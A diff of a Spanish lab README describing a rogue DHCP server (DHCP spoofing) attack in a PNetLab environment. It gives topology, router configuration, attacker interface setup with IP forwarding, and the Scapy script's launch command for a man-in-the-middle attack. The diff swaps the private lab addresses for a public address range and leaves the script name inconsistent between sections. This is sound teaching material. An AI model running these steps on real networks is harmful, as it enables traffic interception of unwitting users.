@@ -1,7 +1,7 @@
 # 🟡 Ataque 03 — DHCP Spoofing: Servidor DHCP Falso (Rogue DHCP)
  
 > **Entorno:** PNetLab + Kali Linux Docker + Cisco IOSvL2 + Cisco IOS Router  
-> **Script:** `03_dhcp_spoofing.py` | **Herramienta:** Python 3 + Scapy
+> **Script:** `dhcp_spoofing.py` | **Herramienta:** Python 3 + Scapy
 
 ---
 
@@ -31,7 +31,7 @@ Cliente           Kali (Rogue DHCP)        R1 (DHCP Legítimo)
    │──── DISCOVER ──────►│ ◄─── DISCOVER ──────────│
    │                     │   (broadcast, todos lo ven)
    │◄─── OFFER ──────────│  [Kali responde primero]
-   │   gateway=192.168.10.50 (Kali)
+   │   gateway=7.41.10.50 (Kali)
    │   dns=atacante
    │                     │
    │──── REQUEST ────────►│
@@ -50,8 +50,8 @@ Cliente           Kali (Rogue DHCP)        R1 (DHCP Legítimo)
 | Parámetro | Descripción | Ejemplo |
 |-----------|-------------|---------|
 | `-i` / `--interface` | Interfaz de red | `eth2` |
-| `--pool` | Rango de IPs a asignar | `192.168.10.200-220` |
-| `--gateway` | Gateway a anunciar (IP de Kali) | `192.168.10.50` |
+| `--pool` | Rango de IPs a asignar | `7.41.10.200-220` |
+| `--gateway` | Gateway a anunciar (IP de Kali) | `7.41.10.50` |
 | `--dns` | Servidor DNS a anunciar | `8.8.8.8` o IP atacante |
 | `--netmask` | Máscara de subred | `255.255.255.0` |
 | `--lease` | Tiempo de arrendamiento (segundos) | `600` |
@@ -83,7 +83,7 @@ sudo / root (obligatorio)
 ┌──────────────────────────────────────────────────────────┐
 │  Topología: DHCP Spoofing                                │
 │                                                          │
-│  192.168.10.1               192.168.10.50                │
+│    7.41.10.1                   7.41.10.50                │
 │  ┌──────────┐               ┌──────────────┐             │
 │  │ Router   │               │  Kali Linux  │             │
 │  │   R1     │               │  (Rogue      │             │
@@ -114,11 +114,11 @@ sudo / root (obligatorio)
 
 | Interfaz / Nodo | Rol y Dirección IP |
 |-----------------|-------------------|
-| R1 — e0/0 | 192.168.10.1/24 — Gateway + DHCP Server legítimo |
-| DHCP Pool legítimo | 192.168.10.101 – 192.168.10.254 |
-| Kali — eth2 | 192.168.10.50/24 — Atacante (Rogue DHCP) |
+| R1 — e0/0 | 7.41.10.1/24 — Gateway + DHCP Server legítimo |
+| DHCP Pool legítimo | 7.41.10.101 – 7.41.10.254 |
+| Kali — eth2 | 7.41.10.50/24 — Atacante (Rogue DHCP) |
 | PC-Víctima — eth1 | DHCP dinámico — obtiene IP del pool malicioso |
-| Red | 192.168.10.0/24 |
+| Red | 7.41.10.0/24 |
 
 ---
 
@@ -128,13 +128,13 @@ sudo / root (obligatorio)
 R1> enable
 R1# configure terminal
 R1(config)# interface e0/0
-R1(config-if)# ip address 192.168.10.1 255.255.255.0
+R1(config-if)# ip address 7.41.10.1 255.255.255.0
 R1(config-if)# no shutdown
 R1(config-if)# exit
-R1(config)# ip dhcp excluded-address 192.168.10.1 192.168.10.100
+R1(config)# ip dhcp excluded-address 7.41.10.1 7.41.10.100
 R1(config)# ip dhcp pool POOL-LEGITIMO
-R1(dhcp-config)# network 192.168.10.0 255.255.255.0
-R1(dhcp-config)# default-router 192.168.10.1
+R1(dhcp-config)# network 7.41.10.0 255.255.255.0
+R1(dhcp-config)# default-router 7.41.10.1
 R1(dhcp-config)# dns-server 8.8.8.8
 R1(dhcp-config)# lease 0 2
 R1(dhcp-config)# exit
@@ -148,11 +148,11 @@ R1(config)# service dhcp
 ip addr flush dev eth2
 
 # Asignar IP estática al atacante
-ip addr add 192.168.10.50/24 dev eth2
+ip addr add 7.41.10.50/24 dev eth2
 ip link set eth2 up
 
 # Ruta por defecto hacia el gateway legítimo
-ip route add default via 192.168.10.1
+ip route add default via 7.41.10.1
 
 # Habilitar IP forwarding (MitM transparente)
 echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -163,7 +163,7 @@ sudo sysctl -w net.ipv4.ip_forward=1
 
 ## 🔍 Funcionamiento del Script
 
-El script `03_dhcp_spoofing.py` implementa el protocolo DHCP completo (handshake DORA) con parámetros maliciosos:
+El script `dhcp_spoofing.py` implementa el protocolo DHCP completo (handshake DORA) con parámetros maliciosos:
 
 **Paso 1 — Escucha pasiva:**
 ```
@@ -173,8 +173,8 @@ Kali escucha paquetes DHCP Discover en broadcast (puerto UDP 67/68)
 **Paso 2 — DHCP Offer malicioso:**
 ```
 Al recibir un Discover, Kali construye y envía un DHCP Offer con:
-  • IP asignada:  del pool falso (ej: 192.168.10.200)
-  • Gateway:      192.168.10.50 (IP de Kali) ← MitM automático
+  • IP asignada:  del pool falso (ej: 7.41.10.200)
+  • Gateway:      7.41.10.50 (IP de Kali) ← MitM automático
   • DNS:          IP controlada por el atacante
   • Netmask:      255.255.255.0
   • Lease time:   600 segundos
@@ -196,15 +196,15 @@ El handshake DORA queda completo
 ```bash
 # Preparar la interfaz de ataque
 ip addr flush dev eth2
-ip addr add 192.168.10.50/24 dev eth2
+ip addr add 7.41.10.50/24 dev eth2
 ip link set eth2 up
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
 # Lanzar el servidor DHCP falso
 sudo python3 03_dhcp_spoofing.py \
   -i eth2 \
-  --pool 192.168.10.200-220 \
-  --gateway 192.168.10.50 \
+  --pool 7.41.10.200-220 \
+  --gateway 7.41.10.50 \
   --dns 8.8.8.8 \
   --netmask 255.255.255.0
 
@@ -218,10 +218,10 @@ sudo dhclient -v eth1    # solicitar nueva IP
 ```bash
 # En la víctima — verificar configuración de red recibida
 ip addr show eth1
-# Esperado: inet 192.168.10.200/24  (IP del pool del atacante)
+# Esperado: inet 7.41.10.200/24  (IP del pool del atacante)
 
 ip route show
-# Esperado: default via 192.168.10.50  (gateway = Kali)
+# Esperado: default via 7.41.10.50  (gateway = Kali)
 
 # En R1 — verificar que el pool legítimo NO fue usado
 show ip dhcp binding
@@ -230,8 +230,6 @@ show ip dhcp pool
 ```
 
 ---
-
-
 ---
 
 ## 🛡️ Contra-medida
